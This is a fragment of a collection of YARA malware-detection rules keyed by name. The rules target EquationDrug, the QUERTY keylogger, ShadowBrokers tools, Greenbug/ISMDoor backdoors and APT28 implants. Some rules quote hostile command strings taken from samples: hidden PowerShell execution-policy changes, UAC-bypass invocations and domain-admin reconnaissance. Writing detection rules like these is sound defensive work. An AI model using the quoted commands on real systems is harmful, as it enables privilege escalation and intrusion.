  "EquationDrug_KernelRootkit": "rule EquationDrug_KernelRootkit \n{\n\n    meta:\n        description = \"EquationDrug - Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"597715224249e9fb77dc733b2e4d507f0cc41af6\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"Parmsndsrv.dbg\" fullword ascii\n        $s2 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s3 = \"msndsrv.sys\" fullword wide\n        $s5 = \"\\\\REGISTRY\\\\MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Windows\" fullword wide\n        $s6 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s7 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s9 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}",
  "EquationDrug_Keylogger": "rule EquationDrug_Keylogger \n{\n\n    meta:\n        description = \"EquationDrug - Key/clipboard logger driver - msrtvd.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"b93aa17b19575a6e4962d224c5801fb78e9a7bb5\"\n\n    strings:\n        $s0 = \"\\\\registry\\\\machine\\\\software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\" fullword wide\n        $s2 = \"\\\\registry\\\\machine\\\\SYSTEM\\\\ControlSet001\\\\Control\\\\Session Manager\\\\En\" wide\n        $s3 = \"\\\\DosDevices\\\\Gk\" fullword wide\n        $s5 = \"\\\\Device\\\\Gk0\" fullword wide\n\n    condition:\n        all of them\n}",
  "EquationDrug_NetworkSniffer4": "rule EquationDrug_NetworkSniffer4 \n{\n\n    meta:\n        description = \"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"cace40965f8600a24a2457f7792efba3bd84d9ba\"\n\n    strings:\n        $s0 = \"Copyright 1999 RAVISENT Technologies Inc.\" fullword wide\n        $s1 = \"\\\\systemroot\\\\\" fullword ascii\n        $s2 = \"RAVISENT Technologies Inc.\" fullword wide\n        $s3 = \"Created by VIONA Development\" fullword wide\n        $s4 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s5 = \"\\\\device\\\\harddiskvolume\" fullword wide\n        $s7 = \"ATMDKDRV.SYS\" fullword wide\n        $s8 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s9 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s10 = \"CineMaster C 1.1 WDM Main Driver\" fullword wide\n        $s11 = \"\\\\Device\\\\%ws\" fullword wide\n        $s13 = \"CineMaster C 1.1 WDM\" fullword wide\n\n    condition:\n        all of them\n}",
  "EquationDrug_PlatformOrchestrator": "rule EquationDrug_PlatformOrchestrator \n{\n\n    meta:\n        description = \"EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"febc4f30786db7804008dc9bc1cebdc26993e240\"\n\n    strings:\n        $s0 = \"SERVICES.EXE\" fullword wide\n        $s1 = \"\\\\command.com\" fullword wide\n        $s2 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s3 = \"LSASS.EXE\" fullword wide\n        $s4 = \"Windows Configuration Services\" fullword wide\n        $s8 = \"unilay.dll\" fullword ascii\n\n    condition:\n        all of them\n}",
  "EquationDrug_NetworkSniffer5": "rule EquationDrug_NetworkSniffer5 \n{\n\n    meta:\n        description = \"EquationDrug - Network-sniffer/patcher - atmdkdrv.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"09399b9bd600d4516db37307a457bc55eedcbd17\"\n\n    strings:\n        $s0 = \"Microsoft(R) Windows (TM) Operating System\" fullword wide\n        $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s2 = \"atmdkdrv.sys\" fullword wide\n        $s4 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s5 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s6 = \"\\\\Device\\\\%ws\" fullword wide\n\n    condition:\n        all of them\n}",
  "EquationDrug_FileSystem_Filter": "rule EquationDrug_FileSystem_Filter \n{\n\n    meta:\n        description = \"EquationDrug - Filesystem filter driver \u2013 volrec.sys, scsi2mgr.sys\"\n        author = \"Florian Roth @4nc4p\"\n        reference = \"http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/\"\n        date = \"2015/03/11\"\n        hash = \"57fa4a1abbf39f4899ea76543ebd3688dcc11e13\"\n\n    strings:\n        $s0 = \"volrec.sys\" fullword wide\n        $s1 = \"volrec.pdb\" fullword ascii\n        $s2 = \"Volume recognizer driver\" fullword wide\n\n    condition:\n        all of them\n}",
  "apt_equation_keyword": "rule apt_equation_keyword \n{\n\n    meta:\n        description = \"Rule to detect Equation group's keyword in executable file\"\n        author = \"Florian Roth @4nc4p\"\n        last_modified = \"2015-09-26\"\n        reference = \"http://securelist.com/blog/research/68750/equation-the-death-star-of-malware-galaxy/\"\n\n    strings:\n         $a1 = \"Backsnarf_AB25\" wide\n         $a2 = \"Backsnarf_AB25\" ascii\n\n    condition:\n         uint16(0) == 0x5a4d and 1 of ($a*)\n}",
  "FVEY_ShadowBrokers_Jan17_Screen_Strings": "rule FVEY_ShadowBrokers_Jan17_Screen_Strings \n{\n\n   meta:\n      description = \"Detects strings derived from the ShadowBroker's leak of Windows tools/exploits\"\n      author = \"Florian Roth\"\n      reference = \"https://bit.no.com:43110/theshadowbrokers.bit/post/message7/\"\n      date = \"2017-01-08\"\n\n   strings:\n      $x1 = \"Danderspritz\" ascii wide fullword\n      $x2 = \"DanderSpritz\" ascii wide fullword\n      $x3 = \"PeddleCheap\" ascii wide fullword\n      $x4 = \"ChimneyPool Addres\" ascii wide fullword\n      $a1 = \"Getting remote time\" fullword ascii\n      $a2 = \"RETRIEVED\" fullword ascii\n      $b1 = \"Added Ops library to Python search path\" fullword ascii\n      $b2 = \"target: z0.0.0.1\" fullword ascii\n      $c1 = \"Psp_Avoidance\" fullword ascii\n      $c2 = \"PasswordDump\" fullword ascii\n      $c3 = \"InjectDll\" fullword ascii\n      $c4 = \"EventLogEdit\" fullword ascii\n      $c5 = \"ProcessModify\" fullword ascii\n      $d1 = \"Mcl_NtElevation\" fullword ascii wide\n      $d2 = \"Mcl_NtNativeApi\" fullword ascii wide\n      $d3 = \"Mcl_ThreatInject\" fullword ascii wide\n      $d4 = \"Mcl_NtMemory\" fullword ascii wide\n\n   condition:\n      filesize < 2000KB and (1 of ($x*) or all of ($a*) or 1 of ($b*) or ( uint16(0) == 0x5a4d and 1 of ($c*) ) or 3 of ($c*) or ( uint16(0) == 0x5a4d and 3 of ($d*) ))\n}",
  "FiveEyes_QUERTY_Malwareqwerty_20121": "rule FiveEyes_QUERTY_Malwareqwerty_20121 \n{\n\n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20121.xml\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"8263fb58350f3b1d3c4220a602421232d5e40726\"\n\n    strings:\n        $s0 = \"<configFileName>20121_cmdDef.xml</configFileName>\" fullword ascii\n        $s1 = \"<name>20121.dll</name>\" fullword ascii\n        $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n        $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n        $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n        $s5 = \"</plugin>\" fullword ascii\n        $s6 = \"</pluginConfig>\" fullword ascii\n        $s7 = \"<pluginConfig>\" fullword ascii\n        $s8 = \"</platform>\" fullword ascii\n        $s9 = \"</lpConfig>\" fullword ascii\n        $s10 = \"<lpConfig>\" fullword ascii\n   \n    condition:\n        9 of them\n}",
  "FiveEyes_QUERTY_Malwaresig_20123_sys": "rule FiveEyes_QUERTY_Malwaresig_20123_sys \n{\n   \n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20123.sys.bin\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"a0f0087bd1f8234d5e847363d7e15be8a3e6f099\"\n  \n    strings:\n        $s0 = \"20123.dll\" fullword ascii\n        $s1 = \"kbdclass.sys\" fullword wide\n        $s2 = \"IoFreeMdl\" fullword ascii\n        $s3 = \"ntoskrnl.exe\" fullword ascii\n        $s4 = \"KfReleaseSpinLock\" fullword ascii\n  \n    condition:\n        all of them\n}",
  "FiveEyes_QUERTY_Malwaresig_20123_cmdDef": "rule FiveEyes_QUERTY_Malwaresig_20123_cmdDef \n{\n  \n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20123_cmdDef.xml\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"7b08fc77629f6caaf8cc4bb5f91be6b53e19a3cd\"\n   \n   strings:\n        $s0 = \"<shortDescription>Keystroke Collector</shortDescription>\" fullword ascii\n        $s1 = \"This plugin is the E_Qwerty Kernel Mode driver for logging keys.</description>\" fullword ascii\n        $s2 = \"<commands/>\" fullword ascii\n        $s3 = \"</version>\" fullword ascii\n        $s4 = \"<associatedImplantId>20121</associatedImplantId>\" fullword ascii\n        $s5 = \"<rightsRequired>System or Administrator (if Administrator, I think the DriverIns\" ascii\n        $s6 = \"<platforms>Windows NT, Windows 2000, Windows XP (32/64 bit), Windows 2003 (32/64\" ascii\n        $s7 = \"<projectpath>plugin/Collection</projectpath>\" fullword ascii\n        $s8 = \"<dllDepend>None</dllDepend>\" fullword ascii\n        $s9 = \"<minorType>0</minorType>\" fullword ascii\n        $s10 = \"<pluginname>E_QwertyKM</pluginname>\" fullword ascii\n        $s11 = \"</comments>\" fullword ascii\n        $s12 = \"<comments>\" fullword ascii\n        $s13 = \"<majorType>1</majorType>\" fullword ascii\n        $s14 = \"<files>None</files>\" fullword ascii\n        $s15 = \"<poc>Erebus</poc>\" fullword ascii\n        $s16 = \"</plugin>\" fullword ascii\n        $s17 = \"<team>None</team>\" fullword ascii\n        $s18 = \"<?xml-stylesheet type=\\\"text/xsl\\\" href=\\\"../XSLT/pluginHTML.xsl\\\"?>\" fullword ascii\n        $s19 = \"<pluginsDepend>U_HookManager v1.0, Kernel Covert Store v1.0</pluginsDepend>\" fullword ascii\n        $s20 = \"<plugin id=\\\"20123\\\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi\" ascii\n  \n    condition:\n        14 of them\n}",
  "FiveEyes_QUERTY_Malwaresig_20121_dll": "rule FiveEyes_QUERTY_Malwaresig_20121_dll \n{\n    \n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20121.dll.bin\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"89504d91c5539a366e153894c1bc17277116342b\"\n    \n    strings:\n        $s0 = \"WarriorPride\\\\production2.0\\\\package\\\\E_Wzowski\" ascii\n        $s1 = \"20121.dll\" fullword ascii\n   \n    condition:\n        all of them\n}",
  "FiveEyes_QUERTY_Malwareqwerty_20123": "rule FiveEyes_QUERTY_Malwareqwerty_20123 \n{\n\n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20123.xml\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"edc7228b2e27df9e7ff9286bddbf4e46adb51ed9\"\n\n    strings:\n        $s0 = \"<!-- edited with XMLSPY v5 rel. 4 U (http://www.xmlspy.com) by TEAM (RENEGADE) -\" ascii\n        $s1 = \"<configFileName>20123_cmdDef.xml</configFileName>\" fullword ascii\n        $s2 = \"<name>20123.sys</name>\" fullword ascii\n        $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n        $s4 = \"<codebase>/bin/i686-pc-win32/debug</codebase>\" fullword ascii\n        $s5 = \"<platform type=\\\"1\\\">\" fullword ascii\n        $s6 = \"</plugin>\" fullword ascii\n        $s7 = \"</pluginConfig>\" fullword ascii\n        $s8 = \"<pluginConfig>\" fullword ascii\n        $s9 = \"</platform>\" fullword ascii\n        $s10 = \"</lpConfig>\" fullword ascii\n        $s11 = \"<lpConfig>\" fullword ascii\n   \n    condition:\n        9 of them\n}",
  "FiveEyes_QUERTY_Malwaresig_20120_dll": "rule FiveEyes_QUERTY_Malwaresig_20120_dll \n{\n\n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20120.dll.bin\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"6811bfa3b8cda5147440918f83c40237183dbd25\"\n\n    strings:\n        $s0 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.txt\" fullword wide\n        $s1 = \"\\\\QwLog_%d-%02d-%02d-%02d%02d%02d.xml\" fullword wide\n        $s2 = \"Failed to send the EQwerty_driverStatusCommand to the implant.\" fullword ascii\n        $s3 = \"- Log Used (number of windows) - %d\" fullword wide\n        $s4 = \"- Log Limit (number of windows) - %d\" fullword wide\n        $s5 = \"Process or User Default Language\" fullword wide\n        $s6 = \"Windows 98/Me, Windows NT 4.0 and later: Vietnamese\" fullword wide\n        $s7 = \"- Logging of keystrokes is switched ON\" fullword wide\n        $s8 = \"- Logging of keystrokes is switched OFF\" fullword wide\n        $s9 = \"Qwerty is currently logging active windows with titles containing the fo\" wide\n        $s10 = \"Windows 95, Windows NT 4.0 only: Korean (Johab)\" fullword wide\n        $s11 = \"FAILED to get Qwerty Status\" fullword wide\n        $s12 = \"- Successfully retrieved Log from Implant.\" fullword wide\n        $s13 = \"- Logging of all Windows is toggled ON\" fullword wide\n        $s14 = \"- Logging of all Windows is toggled OFF\" fullword wide\n        $s15 = \"Qwerty FAILED to retrieve window list.\" fullword wide\n        $s16 = \"- UNSUCCESSFUL Log Retrieval from Implant.\" fullword wide\n        $s17 = \"The implant failed to return a valid status\" fullword ascii\n        $s18 = \"- Log files were NOT generated!\" fullword wide\n        $s19 = \"Windows 2000/XP: Armenian. This is Unicode only.\" fullword wide\n        $s20 = \"- This machine is using a PS/2 Keyboard - Continue on using QWERTY\" fullword wide\n   \n    condition:\n        10 of them\n}",
  "FiveEyes_QUERTY_Malwaresig_20120_cmdDef": "rule FiveEyes_QUERTY_Malwaresig_20120_cmdDef \n{\n\n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20120_cmdDef.xml\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"cda9ceaf0a39d6b8211ce96307302a53dfbd71ea\"\n\n    strings:\n        $s0 = \"This PPC gets the current keystroke log.\" fullword ascii\n        $s1 = \"This command will add the given WindowTitle to the list of Windows to log keys f\" ascii\n        $s2 = \"This command will remove the WindowTitle corresponding to the given window title\" ascii\n        $s3 = \"This command will return the current status of the Keyboard Logger (Whether it i\" ascii\n        $s4 = \"This command Toggles logging of all Keys. If allkeys is toggled all keystrokes w\" ascii\n        $s5 = \"<definition>Turn logging of all keys on|off</definition>\" fullword ascii\n        $s6 = \"<name>Get Keystroke Log</name>\" fullword ascii\n        $s7 = \"<description>Keystroke Logger Lp Plugin</description>\" fullword ascii\n        $s8 = \"<definition>display help for this function</definition>\" fullword ascii\n        $s9 = \"This command will switch ON Logging of keys. All keys taht are entered to a acti\" ascii\n        $s10 = \"Set the log limit (in number of windows)\" fullword ascii\n        $s11 = \"<example>qwgetlog</example>\" fullword ascii\n        $s12 = \"<aliasName>qwgetlog</aliasName>\" fullword ascii\n        $s13 = \"<definition>The title of the Window whose keys you wish to Log once it becomes a\" ascii\n        $s14 = \"This command will switch OFF Logging of keys. No keystrokes will be captured\" fullword ascii\n        $s15 = \"<definition>The title of the Window whose keys you no longer whish to log</defin\" ascii\n        $s16 = \"<command id=\\\"32\\\">\" fullword ascii\n        $s17 = \"<command id=\\\"3\\\">\" fullword ascii\n        $s18 = \"<command id=\\\"7\\\">\" fullword ascii\n        $s19 = \"<command id=\\\"1\\\">\" fullword ascii\n        $s20 = \"<command id=\\\"4\\\">\" fullword ascii\n    \n    condition:\n        10 of them\n}",
  "FiveEyes_QUERTY_Malwareqwerty_20120": "rule FiveEyes_QUERTY_Malwareqwerty_20120 \n{\n\n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20120.xml\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"597082f05bfd3225587d480c30f54a7a1326a892\"\n\n    strings:\n        $s0 = \"<configFileName>20120_cmdDef.xml</configFileName>\" fullword ascii\n        $s1 = \"<name>20120.dll</name>\" fullword ascii\n        $s2 = \"<codebase>\\\"Reserved for future use.\\\"</codebase>\" fullword ascii\n        $s3 = \"<plugin xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\" xsi:noNamespaceS\" ascii\n        $s4 = \"<platform type=\\\"1\\\">\" fullword ascii\n        $s5 = \"</plugin>\" fullword ascii\n        $s6 = \"</pluginConfig>\" fullword ascii\n        $s7 = \"<pluginConfig>\" fullword ascii\n        $s8 = \"</platform>\" fullword ascii\n        $s9 = \"</lpConfig>\" fullword ascii\n        $s10 = \"<lpConfig>\" fullword ascii\n   \n    condition:\n        all of them\n}",
  "FiveEyes_QUERTY_Malwaresig_20121_cmdDef": "rule FiveEyes_QUERTY_Malwaresig_20121_cmdDef \n{\n\n    meta:\n        description = \"FiveEyes QUERTY Malware - file 20121_cmdDef.xml\"\n        author = \"Florian Roth\"\n        reference = \"http://www.spiegel.de/media/media-35668.pdf\"\n        date = \"2015/01/18\"\n        hash = \"64ac06aa4e8d93ea6063eade7ce9687b1d035907\"\n\n    strings:\n        $s0 = \"<shortDescription>Keystroke Logger Plugin.</shortDescription>\" fullword ascii\n        $s1 = \"<message>Failed to get File Time</message>\" fullword ascii\n        $s2 = \"<description>Keystroke Logger Plugin.</description>\" fullword ascii\n        $s3 = \"<message>Failed to set File Time</message>\" fullword ascii\n        $s4 = \"</commands>\" fullword ascii\n        $s5 = \"<commands>\" fullword ascii\n        $s6 = \"</version>\" fullword ascii\n        $s7 = \"<associatedImplantId>20120</associatedImplantId>\" fullword ascii\n        $s8 = \"<message>No Comms. with Driver</message>\" fullword ascii\n        $s9 = \"</error>\" fullword ascii\n        $s10 = \"<message>Invalid File Size</message>\" fullword ascii\n        $s11 = \"<platforms>Windows (User/Win32)</platforms>\" fullword ascii\n        $s12 = \"<message>File Size Mismatch</message>\" fullword ascii\n        $s13 = \"<projectpath>plugin/Utility</projectpath>\" fullword ascii\n        $s14 = \"<pluginsDepend>None</pluginsDepend>\" fullword ascii\n        $s15 = \"<dllDepend>None</dllDepend>\" fullword ascii\n        $s16 = \"<pluginname>E_QwertyIM</pluginname>\" fullword ascii\n        $s17 = \"<rightsRequired>None</rightsRequired>\" fullword ascii\n        $s18 = \"<minorType>0</minorType>\" fullword ascii\n        $s19 = \"<code>00001002</code>\" fullword ascii\n        $s20 = \"<code>00001001</code>\" fullword ascii\n   \n    condition:\n        12 of them\n}",
  "Greenbug_Malware_1": "rule Greenbug_Malware_1 {\n   meta:\n      description = \"Detects Malware from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25\"\n      hash1 = \"dab460a0b73e79299fbff2fa301420c1d97a36da7426acc0e903c70495db2b76\"\n   strings:\n      $s1 = \"vailablez\" fullword ascii\n      $s2 = \"Sfouglr\" fullword ascii\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 400KB and all of them )\n}",
  "Greenbug_Malware_2": "rule Greenbug_Malware_2 {\n   meta:\n      description = \"Detects Backdoor from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25\"\n      hash1 = \"6b28a43eda5b6f828a65574e3f08a6d00e0acf84cbb94aac5cec5cd448a4649d\"\n      hash2 = \"21f5e60e9df6642dbbceca623ad59ad1778ea506b7932d75ea8db02230ce3685\"\n      hash3 = \"319a001d09ee9d754e8789116bbb21a3c624c999dae9cf83fde90a3fbe67ee6c\"\n   strings:\n      $x1 = \"|||Command executed successfully\" fullword ascii\n      $x2 = \"\\\\Release\\\\Bot Fresh.pdb\" ascii\n      $x3 = \"C:\\\\ddd\\\\a1.txt\" fullword wide\n      $x4 = \"Bots\\\\Bot5\\\\x64\\\\Release\" ascii\n      $x5 = \"Bot5\\\\Release\\\\Ism.pdb\" ascii\n      $x6 = \"Bot\\\\Release\\\\Ism.pdb\" ascii\n      $x7 = \"\\\\Bot Fresh\\\\Release\\\\Bot\" ascii\n\n      $s1 = \"/Home/SaveFile?commandId=CmdResult=\" fullword wide\n      $s2 = \"raB3G:Sun:Sunday:Mon:Monday:Tue:Tuesday:Wed:Wednesday:Thu:Thursday:Fri:Friday:Sat:Saturday\" fullword ascii\n      $s3 = \"Set-Cookie:\\\\b*{.+?}\\\\n\" fullword wide\n      $s4 = \"SELECT * FROM AntiVirusProduct\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($x*) or 2 of them ) ) or ( 3 of them )\n}",
  "Greenbug_Malware_3": "rule Greenbug_Malware_3 {\n   meta:\n      description = \"Detects Backdoor from Greenbug Incident\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25\"\n      super_rule = 1\n      hash1 = \"44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49\"\n      hash2 = \"7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c\"\n   strings:\n      $x1 = \"F:\\\\Projects\\\\Bot\\\\Bot\\\\Release\\\\Ism.pdb\" fullword ascii\n      $x2 = \"C:\\\\ddd\\\\wer2.txt\" fullword wide\n      $x3 = \"\\\\Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n   condition:\n      1 of them\n}",
  "Greenbug_Malware_4": "rule Greenbug_Malware_4 {\n   meta:\n      description = \"Detects ISMDoor Backdoor\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25\"\n      super_rule = 1\n      hash1 = \"308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f\"\n      hash2 = \"82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9\"\n   strings:\n      $s1 = \"powershell.exe -nologo -windowstyle hidden -c \\\"Set-ExecutionPolicy -scope currentuser\" fullword ascii\n      $s2 = \"powershell.exe -c \\\"Set-ExecutionPolicy -scope currentuser -ExecutionPolicy unrestricted -f; . \\\"\" fullword ascii\n      $s3 = \"c:\\\\windows\\\\temp\\\\tmp8873\" fullword ascii\n      $s4 = \"taskkill /im winit.exe /f\" fullword ascii\n      $s5 = \"invoke-psuacme\"\n      $s6 = \"-method oobe -payload \\\"\\\"\" fullword ascii\n      $s7 = \"C:\\\\ProgramData\\\\stat2.dat\" fullword wide\n      $s8 = \"Invoke-bypassuac\" fullword ascii\n      $s9 = \"Start Keylog Done\" fullword wide\n      $s10 = \"Microsoft\\\\Windows\\\\WinIt.exe\" fullword ascii\n      $s11 = \"Microsoft\\\\Windows\\\\Tmp9932u1.bat\\\"\" fullword ascii\n      $s12 = \"Microsoft\\\\Windows\\\\tmp43hh11.txt\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them ) or ( 3 of them )\n}",
  "Greenbug_Malware_5": "rule Greenbug_Malware_5 {\n   meta:\n      description = \"Auto-generated rule - from files 308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f, 44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49, 7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c, 82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/urp4CD\"\n      date = \"2017-01-25\"\n      super_rule = 1\n      hash1 = \"308a646f57c8be78e6a63ffea551a84b0ae877b23f28a660920c9ba82d57748f\"\n      hash2 = \"44bdf5266b45185b6824898664fd0c0f2039cdcb48b390f150e71345cd867c49\"\n      hash3 = \"7f16824e7ad9ee1ad2debca2a22413cde08f02ee9f0d08d64eb4cb318538be9c\"\n      hash4 = \"82beaef407f15f3c5b2013cb25901c9fab27b086cadd35149794a25dce8abcb9\"\n   strings:\n      $x1 = \"cmd /u /c WMIC /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter\" fullword ascii\n      $x2 = \"cmd /a /c net user administrator /domain >>\" fullword ascii\n      $x3 = \"cmd /a /c netstat -ant >>\\\"%localappdata%\\\\Microsoft\\\\\" fullword ascii\n\n      $o1 = \"========================== (Net User) ==========================\" ascii fullword\n   condition:\n      filesize < 2000KB and (\n         ( uint16(0) == 0x5a4d and 1 of them ) or\n         $o1\n      )\n}",
  "IMPLANT_1_v1": "rule IMPLANT_1_v1 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {6A ?? E8 ?? ?? FF FF 59 85 C0 74 0B 8B C8 E8 ?? ?? FF FF 8B F0\n         EB 02 33 F6 8B CE E8 ?? ?? FF FF 85 F6 74 0E 8B CE E8 ?? ?? FF FF 56\n         E8 ?? ?? FF FF 59}\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_1_v2": "rule IMPLANT_1_v2 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $STR1 = {83 3E 00 53 74 4F 8B 46 04 85 C0 74 48 83 C0 02 50 E8 ?? ?? 00\n         00 8B D8 59 85 DB 74 38 8B 4E 04 83 F9 FF 7E 21 57 }\n      $STR2 = {55 8B EC 8B 45 08 3B 41 08 72 04 32 C0 EB 1B 8B 49 04 8B 04 81\n         80 78 19 01 75 0D FF 70 10 FF [5] 85 C0 74 E3 }\n   condition:\n      (uint16(0) == 0x5A4D) and any of them\n}",
  "IMPLANT_1_v3": "rule IMPLANT_1_v3 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $rol7encode = { 0F B7 C9 C1 C0 07 83 C2 02 33 C1 0F B7 0A 47 66 85 C9 75 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}",
  "IMPLANT_1_v4": "rule IMPLANT_1_v4 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $XOR_LOOP = { 8B 45 FC 8D 0C 06 33 D2 6A 0B 8B C6 5B F7 F3 8A 82 ?? ??\n         ?? ?? 32 04 0F 46 88 01 3B 75 0C 7C E0 }\n   condition:\n      (uint16(0) == 0x5A4D) and all of them\n}",
  "IMPLANT_1_v5": "rule IMPLANT_1_v5 {\n   meta:\n      description = \"Downrage Implant by APT28\"\n      author = \"US CERT\"\n      reference = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n      date = \"2017-02-10\"\n      score = 85\n   strings:\n      $drivername = { 6A 30 ?? 6A 33 [5] 6A 37 [5] 6A 32 [5] 6A 31 [5] 6A 77\n         [5] 6A 69 [5] 6A 6E [5] 6A 2E [5] 6A 73 [5-9] 6A 79 [5] 6A 73 }\n      $mutexname = { C7 45 ?? 2F 2F 64 66 C7 45 ?? 63 30 31 65 C7 45 ?? 6C 6C\n         36 7A C7 45 ?? 73 71 33 2D C7 45 ?? 75 66 68 68 66 C7 45 ?? 66 }\n   condition:\n      (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or\n      uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}",
